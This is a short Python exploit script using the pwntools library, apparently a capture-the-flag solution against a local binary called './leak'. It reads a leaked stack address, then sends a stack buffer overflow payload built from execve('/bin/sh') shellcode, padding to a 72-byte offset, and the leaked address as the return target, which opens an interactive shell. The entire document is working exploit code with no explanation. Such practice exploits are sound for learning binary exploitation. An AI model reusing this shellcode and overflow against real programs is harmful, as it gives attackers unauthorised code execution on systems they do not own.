#!/usr/bin/python3
from pwn import process, p64

shellcode = b"\x6a\x3b\x58\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x99\x0f\x05"

offset = 72
junk = b"A" * (offset - len(shellcode))

shell = process("./leak")
shell.recvuntil(b"Oops, I'm leaking! ")

leak = p64(int(shell.recvuntil(b"\n"), 16))

payload  = b""
payload += shellcode
payload += junk
payload += leak

shell.sendlineafter(b"> ", payload)
shell.interactive()
